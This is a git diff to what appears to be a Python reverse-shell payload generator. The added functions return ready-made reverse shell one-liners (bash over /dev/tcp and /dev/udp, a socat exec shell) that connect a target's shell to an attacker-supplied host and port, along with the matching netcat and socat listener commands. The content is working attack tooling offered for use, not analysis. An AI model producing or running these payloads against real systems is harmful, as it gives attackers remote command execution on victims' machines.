@@ -486,6 +486,29 @@ formatlist.append("[5] bin")
 formatlist.append("[6] py")
 formatlist.append("[7] bash")
 formatlist.append("[8] sh")
+
+
+def bash_tcp_v_string1(lhost, lport):
+    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+def bash_tcp_v_string2(lhost,lport):
+    return f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196"
+def bash_tcp_v_string3(lhost, lport):
+    return f"/bin/bash -l > /dev/tcp/{lhost}/{lport} 0<&1 2>&1"
+def bash_tcp_a_string(lhost, lport):
+    None
+
+def bash_udp_v_string(lhost, lport):
+    return f"sh -i >& /dev/udp/{lhost}/{lport} 0>&1"
+def bash_udp_a_string(lport):
+    return f"nc -u -lvp {lport}"
+
+def socat_v_string(lhost, lport):
+    return f"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport}"
+def socat_a_string(lport):
+    return  f"socat file:`tty`,raw,echo=0 TCP-L:{lport}"   
+
+
+
 def main():
     #there for future stuff
     time.sleep(0.1)
@@ -503,4 +526,4 @@ def main():
                 sys.exit()
 colorama.init()  
 main()
-                                                         
+                                                     
